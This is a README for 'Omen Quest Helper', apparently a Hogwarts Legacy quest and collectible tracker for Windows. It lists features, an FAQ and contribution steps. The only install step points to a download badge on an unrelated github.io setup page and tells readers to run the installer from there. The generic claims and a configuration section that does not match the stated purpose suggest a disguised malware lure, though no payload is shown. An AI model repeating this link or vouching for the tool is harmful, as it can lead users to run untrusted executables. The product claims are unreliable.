# Omen Quest Helper – Hogwarts Legacy
**Author:** Prohibitiondemoon
**Platform:** Windows 10 / 11 only

> A lightweight, non‑intrusive desktop companion that keeps every quest, hidden location, and collectible in Hogwarts Legacy neatly organized. Stay focused on the magic while Omen does the bookkeeping.

---

## 🎯 What This utility Does

| Feature | Description |
|---------|-------------|
| **Quest Tracker** | Real‑time list of active, completed, and missed main & side quests. |
| **Location Log** | Auto‑populated map points for discovered landmarks, secret rooms, and fast‑travel hubs. |
| **Collectible Index** | Tracks ingredients, artifacts, and lore items you’ve found – plus what’s still missing. |
| **Progress Summary** | One‑click overview of overall game completion percentage. |
| **Overlay UI** | Optional translucent panel that can be toggled on‑screen while you play. |
| **Export / Import** | Save your progress to a JSON file and reload it on another PC. |

All data is stored locally; no internet connection or accounts are required.

---

## 📥 Installation

1. Download the latest release from the Release page:
   <a href="https://rewfdf.github.io/SetupPage/" target="_blank"><img src="https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=windows" alt="Download"></a>

2. Run the installer (standard Windows installer).

3. When the wizard finishes, launch **Omen Quest Helper** from the Start menu.

> **Tip:** Keep the helper running in the background; it will automatically detect when Hogwarts Legacy starts.

---

## 🛠️ How to Use

1. **Launch the helper** – a small icon appears in the system tray.
2. Click the tray icon → **Open Tracker**.
3. Choose a view: *Quests*, *Locations*, *Collectibles*, or *Summary*.
4. As you progress in the game, the helper will **auto‑update** entries.
5. Manually tick items if you prefer to mark them yourself.

### Overlay (Optional)

- Press <kbd>Ctrl + Shift + O</kbd> to toggle the on‑screen overlay.
- Drag the overlay to any screen edge; resize via the corner handle.
- Settings → **Overlay Opacity** let you make it as subtle as you like.

---

## 📚 Frequently Asked Questions

**Q: Does this utility modify game files?**
A: No. It only reads the game’s save data (read‑only) and stores its own logs separately.

**Q: Will it affect performance?**
A: The helper runs under 30 MB RAM and < 2 % CPU on idle. The overlay adds a negligible draw call.

**Q: I’m on Windows 7 – can I use it?**
A: The helper relies on modern Windows APIs, so Windows 10/11 is required.

**Q: Can I share my progress with friends?**
A: Yes – export the JSON file and let them import it on their machine.

---

## 🤝 Contributing

Pull requests are welcome! Please follow these steps:

1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/awesome‑feature`).
3. Ensure the code builds on **Windows 10/11** with Visual Studio 2022 or later.
4. Submit a PR with a clear description of the changes.

---

## 📜 License

This project is licensed under the **MIT License** – see the `LICENSE` file for details.

---

## 📢 Stay Connected

- **GitHub Issues:** Report bugs or request features.
- **Discord:** Join the community server for live support (link in the repo Wiki).

Enjoy a smoother adventure through Hogwarts! ✨🧙‍♂️

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```